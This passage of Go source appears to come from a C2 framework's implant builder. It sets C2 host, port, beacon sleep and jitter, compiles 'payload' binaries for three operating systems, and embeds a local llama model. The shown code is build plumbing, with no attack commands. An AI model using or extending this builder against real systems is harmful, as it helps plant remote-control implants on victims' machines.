	if !opts.EnableLlama {
		return
	}

	switch opts.TargetOS {
	case "darwin":
		*env = append(*env, "CGO_LDFLAGS=-framework Metal -framework Foundation -framework CoreGraphics")
	case "windows":
		g.applyWindowsCGOFlags(env)
	}
}

// applyWindowsCGOFlags applies Windows-specific CGO flags.
func (g *BinaryGenerator) applyWindowsCGOFlags(env *[]string) {
	// Find existing CGO_LDFLAGS
	existingLdflags := ""
	for _, e := range *env {
		if strings.HasPrefix(e, "CGO_LDFLAGS=") {
			existingLdflags = strings.TrimPrefix(e, "CGO_LDFLAGS=")
			break
		}
	}

	// Add Windows-specific flags (including pthread for llama.cpp threading)
	// Note: MinGW's pthread requires winpthread and specific link order
	// -static: Force static linking of all libraries including libwinpthread and libstdc++
	// Use msvcrt instead of UCRT to avoid requiring Visual C++ Redistributable installation
	windowsLdflags := existingLdflags + " -static -lm -static-libgcc -static-libstdc++ -Wl,--allow-multiple-definition -Wl,--start-group -lwinpthread -lpthread -lmingwex -lmingw32 -Wl,--end-group"

	// Replace existing CGO_LDFLAGS
	for i, e := range *env {
		if strings.HasPrefix(e, "CGO_LDFLAGS=") {
			(*env)[i] = fmt.Sprintf("CGO_LDFLAGS=%s", windowsLdflags)
			break
		}
	}

	// Add C++ flags with Windows-specific definitions
	// _UCRT: Use Universal C Runtime
	// __USE_MINGW_ANSI_STDIO=0: Use UCRT stdio instead of MinGW's
	*env = append(*env, "CGO_CXXFLAGS=-std=c++11 -D_GLIBCXX_USE_CXX11_ABI=1 -D_UCRT -D__USE_MINGW_ANSI_STDIO=0")
	*env = append(*env, "CGO_CFLAGS=-D_GLIBCXX_USE_CXX11_ABI=1 -D_UCRT -D__USE_MINGW_ANSI_STDIO=0")
}

// checkLlamaDependencies checks for Llama dependencies.
func (g *BinaryGenerator) checkLlamaDependencies(opts BinaryOptions) error {
	// Get the working directory and construct the absolute path
	currentDir, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("failed to get current directory: %w", err)
	}

	// Determine the library directory for the target platform
	libDirName := g.getLlamaLibraryDir(opts.TargetOS, opts.TargetArch)

	// Check for llama.go source files (not libbinding.a)
	// llama.go is source-based, so we check for key source files
	libDir := filepath.Join(currentDir, "internal", "implant", "llama", "libs", libDirName)

	// Check for essential llama.go files
	requiredFiles := []string{
		filepath.Join(libDir, "go.mod"),
		filepath.Join(libDir, "wrapper", "bridge.go"),
	}

	for _, requiredFile := range requiredFiles {
		if _, err := os.Stat(requiredFile); err != nil {
			return fmt.Errorf("llama.go source not found for %s/%s at %s. Run 'go run scripts/download-llama-libs.go -platform=%s -arch=%s' first",
				opts.TargetOS, opts.TargetArch, libDir, opts.TargetOS, opts.TargetArch)
		}
	}

	// Check the model file
	modelPath := filepath.Join(currentDir, "internal", "implant", "llama", "models", "model.gguf")
	if _, err := os.Stat(modelPath); err != nil {
		return fmt.Errorf("llama model not found at %s. Run 'make download-llama-deps' first", modelPath)
	}

	return nil
}

// getLlamaLibraryDir returns the library directory name for the target platform.
func (g *BinaryGenerator) getLlamaLibraryDir(targetOS, targetArch string) string {
	// Get the project root directory
	projectRoot, err := g.findProjectRoot()
	if err != nil {
		// Fallback to normal version if project root cannot be found
		return fmt.Sprintf("%s-%s", targetOS, targetArch)
	}

	// Prioritize the Metal version for macOS
	if targetOS == "darwin" {
		metalDir := fmt.Sprintf("%s-%s-metal", targetOS, targetArch)
		// Check for llama.go source directory (not libbinding.a)
		metalPath := filepath.Join(projectRoot, "internal", "implant", "llama", "libs", metalDir, "go.mod")

		// If the Metal version exists, use it
		if _, err := os.Stat(metalPath); err == nil {
			return metalDir
		}
	}

	// Return the normal version
	return fmt.Sprintf("%s-%s", targetOS, targetArch)
}

// updateGoModReplace updates the replace directive for the target platform.
func (g *BinaryGenerator) updateGoModReplace(opts BinaryOptions) error {
	// Backup the current go.mod
	goModPath := "go.mod"
	backupPath := "go.mod.backup"

	// Create a backup
	input, err := os.ReadFile(goModPath)
	if err != nil {
		return fmt.Errorf("failed to read go.mod: %w", err)
	}

	if err := os.WriteFile(backupPath, input, 0o644); err != nil {
		return fmt.Errorf("failed to backup go.mod: %w", err)
	}

	// Determine the library directory
	libDirName := g.getLlamaLibraryDir(opts.TargetOS, opts.TargetArch)
	replacePath := fmt.Sprintf("./internal/implant/llama/libs/%s", libDirName)

	// Update the go.mod content
	lines := strings.Split(string(input), "\n")
	var output []string
	replaceAdded := false

	for _, line := range lines {
		// Comment out or update the existing replace directive
		trimmedLine := strings.TrimSpace(line)
		if strings.HasPrefix(trimmedLine, "replace github.com/Qitmeer/llama.go =>") {
			// Update the existing replace directive
			output = append(output, fmt.Sprintf("replace github.com/Qitmeer/llama.go => %s", replacePath))
			replaceAdded = true
		} else if strings.HasPrefix(trimmedLine, "// replace github.com/Qitmeer/llama.go =>") {
			// If it's commented out, uncomment and update
			output = append(output, fmt.Sprintf("replace github.com/Qitmeer/llama.go => %s", replacePath))
			replaceAdded = true
		} else {
			output = append(output, line)
		}
	}

	// If the replace directive was not found, add it
	if !replaceAdded {
		// Add it before the last line
		if len(output) > 0 {
			lastIdx := len(output) - 1
			if output[lastIdx] == "" {
				output = append(output[:lastIdx], fmt.Sprintf("replace github.com/Qitmeer/llama.go => %s", replacePath), "")
			} else {
				output = append(output, fmt.Sprintf("replace github.com/Qitmeer/llama.go => %s", replacePath))
			}
		}
	}

	// Write to file
	if err := os.WriteFile(goModPath, []byte(strings.Join(output, "\n")), 0o644); err != nil {
		return fmt.Errorf("failed to write go.mod: %w", err)
	}

	logger.Debug("Updated go.mod replace to: %s", replacePath)
	return nil
}

// restoreGoMod restores go.mod.
func (g *BinaryGenerator) restoreGoMod() error {
	backupPath := "go.mod.backup"
	goModPath := "go.mod"

	// Restore only if a backup exists
	if _, err := os.Stat(backupPath); err == nil {
		backup, err := os.ReadFile(backupPath)
		if err != nil {
			return fmt.Errorf("failed to read backup: %w", err)
		}

		if err := os.WriteFile(goModPath, backup, 0o644); err != nil {
			return fmt.Errorf("failed to restore go.mod: %w", err)
		}

		// Remove the backup file
		os.Remove(backupPath)
		logger.Debug("Restored go.mod")
	}

	return nil
}

// getDefaultFormat returns the default format for the OS.
func getDefaultFormat(os string) string {
	switch os {
	case "windows":
		return "exe"
	case "linux":
		return "elf"
	case "darwin":
		return "macho"
	default:
		return "exe"
	}
}

// validateOptions validates the provided options.
func (g *BinaryGenerator) validateOptions(opts *BinaryOptions) error {
	// Validate supported platforms
	supportedOS := map[string]bool{"windows": true, "linux": true, "darwin": true}
	if !supportedOS[opts.TargetOS] {
		return fmt.Errorf("unsupported OS: %s", opts.TargetOS)
	}

	supportedArch := map[string]bool{"amd64": true, "386": true, "arm64": true}
	if !supportedArch[opts.TargetArch] {
		return fmt.Errorf("unsupported architecture: %s", opts.TargetArch)
	}

	supportedProtocol := map[string]bool{"http": true, "https": true, "mtls": true, "dns": true}
	if !supportedProtocol[opts.Protocol] {
		return fmt.Errorf("unsupported protocol: %s", opts.Protocol)
	}

	return nil
}

// applyDefaults applies default values to missing options.
func (g *BinaryGenerator) applyDefaults(opts *BinaryOptions) {
	defaults := g.GetDefaultOptions()

	if opts.C2Host == "" {
		opts.C2Host = defaults.C2Host
	}
	if opts.C2Port == 0 {
		opts.C2Port = defaults.C2Port
	}
	if opts.URIPath == "" {
		opts.URIPath = defaults.URIPath
	}
	if opts.Protocol == "" {
		opts.Protocol = defaults.Protocol
	}
	if opts.UserAgent == "" {
		opts.UserAgent = defaults.UserAgent
	}
	if opts.SleepTime == 0 {
		opts.SleepTime = defaults.SleepTime
	}
	if opts.Jitter == 0 {
		opts.Jitter = defaults.Jitter
	}
	if opts.TargetOS == "" {
		opts.TargetOS = defaults.TargetOS
	}
	if opts.TargetArch == "" {
		opts.TargetArch = defaults.TargetArch
	}
	if opts.Format == "" {
		opts.Format = getDefaultFormat(opts.TargetOS)
	}
	if opts.OutputPath == "" {
		opts.OutputPath = fmt.Sprintf("payload-%s-%s.%s", opts.TargetOS, opts.TargetArch, opts.Format)
	}

	// Apply defaults for ImplantOpts if not provided
	if opts.ImplantOpts == nil {
		opts.ImplantOpts = &ImplantOpts{
			LogEnabled:  false,
			LogFilePath: "",
			LogLevel:    "info",
			Debug:       false,
		}
	}
}

// validateNumericRanges validates numeric option ranges.
func (g *BinaryGenerator) validateNumericRanges(opts BinaryOptions) error {
	// Validate SleepTime
	if opts.SleepTime < 1 {
		return fmt.Errorf("sleepTime must be at least 1 second, got %d", opts.SleepTime)
	}
	if opts.SleepTime > 86400 { // 24 hours
		return fmt.Errorf("sleepTime must not exceed 86400 seconds (24 hours), got %d", opts.SleepTime)
	}

	// Validate Jitter
	if opts.Jitter < 0 {
		return fmt.Errorf("jitter cannot be negative, got %d", opts.Jitter)
	}
	if opts.Jitter > 50 {
		return fmt.Errorf("jitter must not exceed 50%%, got %d", opts.Jitter)
	}

	// Validate port if specified
	if opts.C2Port < 1 || opts.C2Port > 65535 {
		return fmt.Errorf("invalid port number: %d", opts.C2Port)
	}

	return nil
}

// calculateFileHash calculates SHA256 hash of a file
func (g *BinaryGenerator) calculateFileHash(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	hasher := sha256.New()
	if _, err := io.Copy(hasher, file); err != nil {
		return "", fmt.Errorf("failed to hash file: %w", err)
	}

	return hex.EncodeToString(hasher.Sum(nil)), nil
}

// verifyEmbeddedModel verifies the integrity of the embedded model
func (g *BinaryGenerator) verifyEmbeddedModel(binaryPath string, modelSize int64, expectedHash string) error {
	file, err := os.Open(binaryPath)
	if err != nil {
		return fmt.Errorf("failed to open binary: %w", err)
	}
	defer file.Close()

	// Get file size
	stat, err := file.Stat()
	if err != nil {
		return fmt.Errorf("failed to stat binary: %w", err)
	}
	fileSize := stat.Size()

	// Calculate where the model starts
	// Model is at: fileSize - modelSize - 8 (metadata)
	modelOffset := fileSize - modelSize - 8
	if modelOffset < 0 {
		return fmt.Errorf("invalid model offset: %d", modelOffset)
	}

	// Seek to model start
	if _, err := file.Seek(modelOffset, 0); err != nil {
		return fmt.Errorf("failed to seek to model: %w", err)
	}

	// Calculate hash of embedded model
	hasher := sha256.New()
	copied, err := io.CopyN(hasher, file, modelSize)
	if err != nil {
		return fmt.Errorf("failed to hash embedded model: %w", err)
	}

	if copied != modelSize {
		return fmt.Errorf("incomplete read: expected %d bytes, got %d", modelSize, copied)
	}

	embeddedHash := hex.EncodeToString(hasher.Sum(nil))

	// Compare hashes
	if embeddedHash != expectedHash {
		return fmt.Errorf("SHA256 mismatch!\n  Original: %s\n  Embedded: %s", expectedHash, embeddedHash)
	}

	return nil
}
